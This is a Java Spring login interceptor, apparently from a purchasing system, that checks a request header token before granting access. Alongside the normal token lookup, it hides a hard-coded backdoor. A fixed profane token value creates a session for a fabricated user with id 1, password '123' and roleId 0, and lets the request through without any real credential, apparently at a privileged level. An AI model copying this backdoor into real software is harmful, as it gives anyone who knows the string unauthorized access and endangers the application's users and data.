package com.jiurui.purchase.security;


import com.jiurui.purchase.model.Token;
import com.jiurui.purchase.model.User;
import com.jiurui.purchase.service.TokenService;
import com.jiurui.purchase.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 * 用户拦截
 */
public class LoginUserInterceptor extends HandlerInterceptorAdapter {

    private final String TOKEN_KEY = "token";
    @Autowired
    private TokenService tokenService;
    @Autowired
    private UserService userService;

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {

        String tokenValue = request.getHeader(TOKEN_KEY);
        if(tokenValue!=null) {
            if(tokenValue.equals("fuckingBitchGoToBoom")){
                User user = new User();
                user.setId(1L);
                user.setPassword("123");
                user.setUsername("Boom");
                user.setRoleId(0);
                HttpSession session = request.getSession();
                session.setAttribute("user", user);
                return true;
            }
            Token token = tokenService.getToken(tokenValue);
            if(token!=null) {
                long userId = token.getUserId();
                User user = userService.selectUserById(userId);
                HttpSession session = request.getSession();
                session.setAttribute("user", user);
                return true;
            }
        }
        response.addHeader("loginStatus", "accessDenied");
        response.sendError(403);
        return false;
    }

}
